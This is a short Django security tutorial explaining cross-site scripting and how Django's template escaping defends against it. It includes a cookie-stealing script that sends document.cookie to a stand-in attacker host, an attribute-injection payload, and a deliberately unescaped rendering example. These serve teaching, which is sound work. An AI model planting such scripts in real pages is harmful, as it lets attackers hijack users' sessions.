- We will be mostly talking about web security in this doc and specifically how can django be strong armed against all kind of attacks. 
- So it is preferable that the reader first goes through this [doc](https://docs.djangoproject.com/en/3.0/topics/security/).



## Cross site scripting

- __How does it work?__

  - An attacker somehow manages to inject a JavaScript into the web-page which is considered as a source code by browser and if user click on such element the JavaScript injected by attacker can perform dangerous actions with it.

- __What can attacker do if he able to pull off the injecting part?__

  - Malicious JavaScript has access to all the objects that the rest of the web page has access to. This includes access to the user’s cookies. Cookies are often used to store session tokens. If an attacker can obtain a user’s session cookie, they can impersonate that user, perform actions on behalf of the user, and gain access to the user’s sensitive data.
  - JavaScript can use the `XMLHttpRequest` object to send HTTP requests with arbitrary content to arbitrary destinations.
  - JavaScript in modern browsers can use HTML-5 API. For example, it can gain access to the user’s Geo-location, webcam, microphone, and even specific files from the user’s file system. Most of these APIs require user opt-in, but the attacker can use social engineering to go around that limitation.

- __Here is an example of how this attack works:__

  - Let's say we have a code in our web-page which looks like this:

    

    ```python
    webpage_response = f"""<html>
    <head>
    <title>comments/my_post</title>
    </head>
    <body>
    <h1>My Post latest comments</h1>
    <span>{{ database.latest_comments }}</span>
    </body>
    </html>"""
    return render(webpage_response)
    ```

    

  - Now if some attacker adds a comment to post which is:

    ```javascript
    <script>
    window.location="http://attacker.domain/?cookie=" + document.cookie
    </script>
    ```

    

  - When this web-page will be rendered by any of the website user this script is executed and the information that is stored as cookies will be sent to the attackers website.

  - Keep in mind that lot site keep client secrets in cookies.

  - More info can be found [here](https://owasp.org/www-community/xss-filter-evasion-cheatsheet).

- __How to save ourselves?__

  - Django templates [escape specific characters](https://docs.djangoproject.com/en/3.0/ref/templates/language/#automatic-html-escaping) which are particularly dangerous to HTML. While this protects users from most malicious input, it is not entirely foolproof. For example, it will not protect the following:

    ```css
    <style class={{ var }}>...</style>
    ```

  - If `var` is set to `'class1 onmouseover=javascript:func()'`, this can result in unauthorized JavaScript execution, depending on how the browser renders imperfect HTML. (Quoting the attribute value would fix this case.)

  - It is also important to be particularly careful when using `is_safe` with custom template tags, the [`safe`](https://docs.djangoproject.com/en/3.0/ref/templates/builtins/#std:templatefilter-safe) template tag, [`mark_safe`](https://docs.djangoproject.com/en/3.0/ref/utils/#module-django.utils.safestring), and when autoescape is turned off.

  - Most of the time the protection towards this kind of attacks is escaping the dangerous characters or syntax when anything in web-page is dynamic.